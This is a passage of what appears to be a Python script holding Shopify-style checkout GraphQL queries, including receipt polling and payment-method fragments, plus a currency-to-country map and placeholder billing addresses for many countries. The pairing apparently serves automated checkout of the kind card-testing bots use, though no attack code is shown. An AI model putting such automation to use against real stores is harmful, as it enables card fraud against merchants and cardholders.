orderingIndex...CustomerCreditCardPaymentMethodFragment}... on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{... on DepositPercentage{percentage __typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}poNumber merchandise{... on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails... on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{... on ProposalMerchandiseQuantityByItem{items{... on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{... on FilledBuyerIdentityTerms{customer{... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}... on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{... on SMSMarketingConsent{value __typename}... on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{... on FilledDutyTerms{totalDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tax{... on FilledTaxTerms{totalTaxAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{... on TargetAllLines{__typename}__typename}__typename}__typename}... on PendingTerms{pollDelay __typename}... on UnavailableTerms{__typename}__typename}tip{tipSuggestions{... on TipSuggestion{__typename percentage amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{... on FilledTipTerms{tipLines{amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{... on LocalizationExtension{fields{... on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{... on RetailAttributions{deviceId locationId userId __typename}... on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{... on SaleAttribution{recipient{... on StaffMember{id __typename}... on Location{id __typename}... on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment... on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{... on Captcha{provider challenge sitekey token __typename}... on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{... on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{... on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename... on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}... on PendingTerms{pollDelay taskId __typename}... on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{... on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}... on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}... on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}... on PaypalWalletContent{paypalBillingAddress:billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}... on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}... on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}... on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on OffsitePaymentMethod{paymentMethodIdentifier name __typename}... on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}... on ManualPaymentMethod{id name paymentMethodIdentifier __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}... on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}... on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{... on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{... on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}... on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}... on WaitingReceipt{id pollDelay __typename}... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}... on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}... on FailedReceipt{id processingError{... on InventoryClaimFailure{__typename}... on InventoryReservationFailure{__typename}... on OrderCreationFailure{paymentsHaveBeenReverted __typename}... on OrderCreationSchedulingFailure{__typename}... on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}... on DiscountUsageLimitExceededFailure{__typename}... on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{... on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{... on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{... on PurchaseOrderPaymentTerms{billingAddress{__typename... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}... on PaypalWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}... on ApplePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}data signature version __typename}... on GooglePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on PaypalBillingAgreementPaymentMethod{token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{... on PurchaseOrderBuyerIdentityTerms{contactMethod{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}... on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename... on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{... on MerchandisePropertyValueString{string:value __typename}... on MerchandisePropertyValueInt{int:value __typename}... on MerchandisePropertyValueFloat{float:value __typename}... on MerchandisePropertyValueBoolean{boolean:value __typename}... on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{... on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}... on DiscountCodeTrigger{code __typename}... on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{... on PercentageValue{percentage __typename}... on FixedAmountValue{appliesOnEachItem fixedAmount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
    "EUR": "DE",
    "AUD": "AU",
    "NZD": "NZ",
    "SGD": "SG",
    "SEK": "SE",
    "NOK": "NO",
    "DKK": "DK",
    "MXN": "MX",
    "BRL": "BR",
}

book = {
    "US": {"address1": "123 Main", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Friedrichstraße 10", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "030 1234567"},
    "FR": {"address1": "10 Rue de la Paix", "city": "Paris", "postalCode": "75002", "zoneCode": "IDF", "countryCode": "FR", "phone": "01 23 456789"},
    "IT": {"address1": "Via Roma 1", "city": "Rome", "postalCode": "00184", "zoneCode": "RM", "countryCode": "IT", "phone": "06 1234567"},
    "ES": {"address1": "Gran Vía 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "M", "countryCode": "ES", "phone": "91 1234567"},
    "NL": {"address1": "Damrak 1", "city": "Amsterdam", "postalCode": "1012", "zoneCode": "NH", "countryCode": "NL", "phone": "020 1234567"},
    "BE": {"address1": "Grand Place 1", "city": "Brussels", "postalCode": "1000", "zoneCode": "BRU", "countryCode": "BE", "phone": "02 1234567"},
    "SE": {"address1": "Sveavägen 1", "city": "Stockholm", "postalCode": "11120", "zoneCode": "AB", "countryCode": "SE", "phone": "08 1234567"},
    "NO": {"address1": "Karl Johans gate 1", "city": "Oslo", "postalCode": "0154", "zoneCode": "03", "countryCode": "NO", "phone": "22 123456"},
    "DK": {"address1": "Strøget 1", "city": "Copenhagen", "postalCode": "1160", "zoneCode": "84", "countryCode": "DK", "phone": "33 123456"},
